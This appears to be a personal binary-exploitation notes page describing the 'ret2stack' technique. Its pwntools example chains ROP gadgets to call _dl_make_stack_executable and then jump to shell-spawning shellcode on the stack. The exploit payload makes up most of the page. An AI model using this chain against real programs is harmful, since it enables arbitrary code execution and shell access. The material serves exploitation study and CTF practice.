---
title: "ret2stack"
tags: [Binary Exploitation]
excerpt: "Making stack executable"
layout: single
classes: wide
--- 

## Making the stack executable
* Set value of `__stack_prot` to 7
* Call `_dl_make_stack_executable(__libc_stack_end, __stack_prot)`
* Jump to shellcode

## Example
```python
shellcode = asm(shellcraft.sh())

_dl_make_stack_executable = elf.symbols['_dl_make_stack_executable']
__stack_prot = elf.symbols['__stack_prot']
__libc_stack_end = elf.symbols['__libc_stack_end']

payload = 'A'*120
payload += p64(0x0000000000410ca3) # pop rsi ; ret
payload += p64(__stack_prot)
payload += p64(0x00000000004163f4) # pop rax ; ret
payload += p64(0x7)
payload += p64(0x000000000047ff91) # mov qword ptr [rsi], rax ; ret
payload += p64(0x0000000000400696) # pop rdi ; ret
payload += p64(__libc_stack_end)
payload += p64(_dl_make_stack_executable)
payload += p64(0x0000000000451974) # push rsp ; ret
payload += shellcode
```
